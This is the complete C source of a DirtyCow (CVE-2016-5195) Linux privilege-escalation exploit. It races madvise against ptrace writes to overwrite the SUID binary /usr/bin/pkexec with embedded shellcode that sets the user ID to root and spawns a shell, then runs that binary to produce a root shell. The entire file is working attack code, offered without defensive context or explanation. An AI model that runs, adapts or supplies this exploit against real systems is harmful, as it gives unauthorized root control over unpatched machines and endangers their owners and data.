#include <stdio.h> #include <stdlib.h> #include <sys/mman.h> #include <fcntl.h> #include <pthread.h> #include <string.h> #include <unistd.h> #include <sys/wait.h> #include <sys/ptrace.h> #include <sys/types.h> #include <sys/stat.h> #include <stdint.h>

void *map; int f; int stop = 0; struct stat st; char *name; pthread_t pth1,pth2,pth3; char suid_binary[] = "/usr/bin/pkexec"; unsigned char sc[] = { 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05 }; unsigned int sc_len = 177; void *madviseThread(void *arg) { int i,c=0; for(i=0;i<100000000 && !stop;i++) { c+=madvise(map,100,MADV_DONTNEED); } printf("madviseThread thread stopped %d, c %d\n", stop, c); }

#if 0 void *procselfmemThread_selfmem(void *arg) { char str; str=(char)arg; int f=open("/proc/self/mem",O_RDWR); int i,c=0; for(i=0;i<100000000 && !stop;i++) { lseek(f,map,SEEK_SET); c+=write(f, str, sc_len); } printf("procselfmemThread thread stopped %d, c %d\n", stop, c); } #endif void *procselfmemThread(pid_t pid, void *arg) { char *str; int u, i, o, c = 0, l = sc_len/sizeof(long)+1;

str=(char*)arg;
for(i = 0; i < 100000/l; i++) {
    for(o = 0; o < l; o++) {
        for(u = 0; u < 100000; u++) {
            c+=ptrace(PTRACE_POKETEXT,
                      pid,
                      map+o*sizeof(long),
                      *((long*)(str+o*sizeof(long))));
         if (stop)
                 goto out;
        }
    }
}
out: printf("procselfmemThread thread stopped %d, c %d\n", stop, c); kill(pid,SIGTERM); }

void *waitForWrite(void *arg) { char buf[sc_len];

for(;;) {
    FILE *fp = fopen(suid_binary, "rb");

    fread(buf, sc_len, 1, fp);

    if(memcmp(buf, sc, sc_len) == 0) {
        printf("%s is overwritten\n", suid_binary);
        break;
    }

    fclose(fp);
    sleep(1);
}

stop = 1;

sleep(1);

printf("Popping root shell.\n");
printf("Don't forget to restore /tmp/bak\n");

system(suid_binary);
}

int main(int argc,char *argv[]) { char *backup; pid_t pid;

printf("DirtyCow root privilege escalation\n");
printf("Backing up %s.. to /tmp/bak\n", suid_binary);

asprintf(&backup, "cp %s /tmp/bak", suid_binary);
system(backup);

f = open(suid_binary,O_RDONLY);
fstat(f,&st);

printf("Size of binary: %lu\n", st.st_size);

char payload[st.st_size];
memset(payload, 0x90, st.st_size);
memcpy(payload, sc, sc_len+1);

map = mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);

printf("Racing, this may take a while..\n");


pthread_create(&pth3, NULL, &waitForWrite, NULL);
pid = fork();
if (pid) {
    waitpid(pid,NULL,0);
    procselfmemThread(pid, payload);
} else {
    pthread_create(&pth1, NULL, &madviseThread, NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(),SIGSTOP);
    pthread_join(pth1,NULL);
}

pthread_join(pth3, NULL);

return 0;
}
